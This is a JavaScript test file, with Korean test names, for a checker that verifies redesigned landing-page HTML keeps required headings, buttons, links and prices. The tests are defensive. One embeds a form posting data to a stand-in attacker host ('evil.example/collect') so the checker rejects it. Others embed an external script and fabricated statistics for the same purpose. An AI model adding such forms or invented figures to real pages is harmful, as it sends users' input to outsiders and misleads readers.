import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { parseHTML } from 'linkedom';
import { extractContent } from '../src/core/extract.js';
import { buildMustKeep } from '../src/core/mustKeep.js';
import { checkHtml } from '../src/core/checker.js';

const BASE = 'https://example.com/';
const original = fs.readFileSync(new URL('./fixtures/landing.html', import.meta.url), 'utf8');
const content = extractContent(parseHTML(original).document, BASE);
const originalText = content.fullText;
const fresh = () => buildMustKeep(content).items;

// 레이아웃은 원본과 다르지만 지켜야 할 것 14개를 모두 담은 시안
function variant({ body } = {}) {
  return `<!doctype html><html><head><title>시안</title><style>body{margin:0}</style></head><body>
  <nav><a href="https://example.com/">홈</a><a href="/about">소개</a><a href="/events">행사</a></nav>
  <h1>AI 빌더를 위한 커뮤니티</h1>
  <p>매주 모여 만든 것을 나누고 서로의 서비스를 함께 키워 가는 모임입니다.</p>
  <a class="cta" href="https://example.com/join/">Join 지금 참가하기</a>
  <button>더 알아보기</button><div role="button">후원하기</div>
  <h2>이번 주 행사</h2><h2>함께 만든 것들</h2><h2>요금</h2><h2>자주 묻는 질문</h2>
  <p>₩0 시작, 정식은 월 9900원</p>${body ?? ''}
  </body></html>`;
}

const run = (html, items = fresh(), extra = {}) => checkHtml(html, items, originalText, { baseUrl: BASE, ...extra });

test('모두 있으면 통과, ok와 total이 같다', () => {
  const r = run(variant());
  assert.equal(r.total, 14);
  assert.equal(r.ok, 14);
  assert.equal(r.passed, true);
  assert.deepEqual(r.missingKinds, []);
  assert.deepEqual(r.externalScripts, []);
  assert.deepEqual(r.externalForms, []);
  assert.deepEqual(r.inventedNumbers, []);
  assert.equal(r.sizeOk, true);
  assert.equal(r.items.length, 14);
  assert.ok(r.items.every((i) => i.ok));
});

test('₩0이 없으면 통과하지 못하고 missingKinds에 price', () => {
  const r = run(variant().replace('₩0 시작, ', ''));
  assert.equal(r.passed, false);
  assert.equal(r.ok, 13);
  assert.deepEqual(r.missingKinds, ['price']);
  assert.equal(r.items.find((i) => i.id === 'price-0').ok, false);
});

test('원본 /join, 시안 https://example.com/join/ 는 같은 링크 (기준 주소 없이도)', () => {
  const items = [{ id: 'button-0', kind: 'button', text: '지금 참가하기', href: '/join', enabled: true }];
  const html = '<body><a href="https://example.com/join/">지금 참가하기</a></body>';
  assert.equal(checkHtml(html, items, originalText).passed, true);
  assert.equal(checkHtml(html, items, originalText, { baseUrl: BASE }).passed, true);
});

test('버튼 글자는 있어도 href가 다르면 실패', () => {
  const html = variant().replace('https://example.com/join/', 'https://example.com/signup');
  const r = run(html);
  assert.equal(r.passed, false);
  assert.equal(r.items.find((i) => i.id === 'button-0').ok, false);
  assert.deepEqual(r.missingKinds, ['button']);
});

test('쿼리와 해시는 href 비교에서 무시한다', () => {
  const html = variant().replace('https://example.com/join/', 'https://example.com/join?ref=a#top');
  assert.equal(run(html).passed, true);
});

test('외부 <script src>는 실패', () => {
  const r = run(variant({ body: '<script src="https://cdn.tailwindcss.com"></script>' }));
  assert.equal(r.externalScripts.length, 1);
  assert.equal(r.externalScripts[0], 'https://cdn.tailwindcss.com');
  assert.equal(r.passed, false);
  assert.equal(r.ok, r.total);
});

test('인라인 스크립트는 괜찮다', () => {
  const r = run(variant({ body: '<script>document.title="x"</script>' }));
  assert.equal(r.externalScripts.length, 0);
  assert.equal(r.passed, true);
});

test('외부로 보내는 form action은 실패', () => {
  const r = run(variant({ body: '<form action="https://evil.example/collect" method="post"><input name="a"></form>' }));
  assert.equal(r.externalForms.length, 1);
  assert.equal(r.passed, false);
});

test('action이 없거나 상대 경로인 form은 외부가 아니다', () => {
  const r = run(variant({ body: '<form><input></form><form action="#x"></form>' }));
  assert.equal(r.externalForms.length, 0);
});

test('원본에 없는 숫자는 inventedNumbers에, 원본에 있는 숫자는 제외', () => {
  const r = run(variant({ body: '<p>만족도 98% 사용자 1,200명</p>' }));
  assert.ok(r.inventedNumbers.includes('98%'));
  assert.ok(r.inventedNumbers.includes('1,200명'));
  assert.ok(!r.inventedNumbers.some((n) => n.includes('9,900') || n.includes('9900')));
  assert.ok(!r.inventedNumbers.some((n) => n.includes('₩0')));
  assert.equal(r.passed, false);
});

test('enabled가 false인 항목은 total에서 빠진다', () => {
  const items = fresh();
  items.find((i) => i.id === 'nav-0').enabled = false;
  items.find((i) => i.id === 'price-0').enabled = false;
  const html = variant().replace('₩0 시작, ', '').replace('<a href="https://example.com/">홈</a>', '');
  const r = run(html, items);
  assert.equal(r.total, 12);
  assert.equal(r.ok, 12);
  assert.equal(r.passed, true);
  assert.equal(r.items.length, 12);
});

test('공백·대소문자·문장부호가 달라도 같은 글자로 본다', () => {
  const items = [
    { id: 'h1-0', kind: 'h1', text: 'JOIN  Now!', enabled: true },
    { id: 'price-0', kind: 'price', text: '월 9,900원', enabled: true },
  ];
  const r = checkHtml('<body><h1>join now</h1><p>월9900 원</p></body>', items, originalText);
  assert.equal(r.passed, true);
});

test('보이지 않는 글자(hidden, script, title)는 글자로 세지 않는다', () => {
  const items = [
    { id: 'price-0', kind: 'price', text: '₩0', enabled: true },
    { id: 'h2-0', kind: 'h2', text: '요금', enabled: true },
    { id: 'h2-1', kind: 'h2', text: '문의', enabled: true },
  ];
  const html = '<html><head><title>₩0 요금</title></head><body><p hidden>₩0</p><script>var s="요금"</script><style>/* 문의 */</style></body></html>';
  const r = checkHtml(html, items, originalText);
  assert.equal(r.ok, 0);
  assert.deepEqual(r.missingKinds, ['price', 'h2']);
});

test('파일 크기 2MB 초과는 실패', () => {
  const big = variant({ body: `<!--${'x'.repeat(2 * 1024 * 1024 + 10)}-->` });
  const r = run(big);
  assert.equal(r.sizeOk, false);
  assert.equal(r.passed, false);
});

test('빈 HTML도 오류 없이 모두 누락으로 나온다', () => {
  const r = run('');
  assert.equal(r.ok, 0);
  assert.equal(r.total, 14);
  assert.equal(r.passed, false);
});
